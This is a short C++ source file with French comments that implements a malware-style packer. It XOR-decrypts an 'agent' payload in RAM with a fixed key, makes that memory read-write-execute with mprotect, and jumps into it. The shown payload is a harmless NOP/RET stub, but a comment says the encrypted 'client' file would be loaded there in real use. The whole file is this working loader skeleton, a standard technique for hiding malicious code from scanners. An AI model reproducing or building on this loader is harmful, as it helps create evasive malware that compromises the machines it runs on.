#include <iostream>
#include <vector>
#include <sys/mman.h>
#include <cstring>
#include <unistd.h>

// 🗝️ CLÉ DE DÉCHIFFREMENT DU PACKER
#define PACKER_KEY 0xDE

typedef void (*EntryPoint)(); // Pointeur vers la fonction d'entrée de l'agent

void run_packed_payload(std::vector<unsigned char>& payload) {
    // 1. Déchiffrement du payload en RAM
    for (size_t i = 0; i < payload.size(); i++) {
        payload[i] ^= PACKER_KEY;
    }

    // 2. Alignement mémoire (Indispensable pour mprotect)
    size_t pageSize = sysconf(_SC_PAGESIZE);
    void* addr = (void*)((unsigned long)payload.data() & ~(pageSize - 1));

    // 3. 🛡️ CHANGEMENT DES PERMISSIONS (RWX : Read, Write, Execute)
    if (mprotect(addr, payload.size() + ((unsigned long)payload.data() & (pageSize - 1)), 
                 PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect");
        return;
    }

    std::cout << "\033[1;32m[PACKER]\033[0m Payload déchiffré en RAM. Saut vers l'exécution...\n";

    // 4. Exécution du code dépaqueté
    EntryPoint start_agent = (EntryPoint)payload.data();
    start_agent(); 
}

// 🚀 LE POINT D'ENTRÉE MANQUANT
int main() {
    std::cout << "\033[1;36m[SYSTEME]\033[0m Initialisation de l'enveloppe Packer...\n";

    // Simulation d'un payload (Dans la réalité, c'est ici qu'on charge le fichier 'client' chiffré)
    // 0x90 = NOP (Ne rien faire), 0xC3 = RET (Retourner/Quitter).
    // On les chiffre avec 0xDE pour simuler un agent "packé"
    std::vector<unsigned char> dummy_payload = { 
        static_cast<unsigned char>(0x90 ^ PACKER_KEY), 
        static_cast<unsigned char>(0x90 ^ PACKER_KEY), 
        static_cast<unsigned char>(0xC3 ^ PACKER_KEY) 
    };

    run_packed_payload(dummy_payload);

    std::cout << "\033[1;32m[PACKER]\033[0m Exécution terminée avec succès.\n";
    return 0;
}
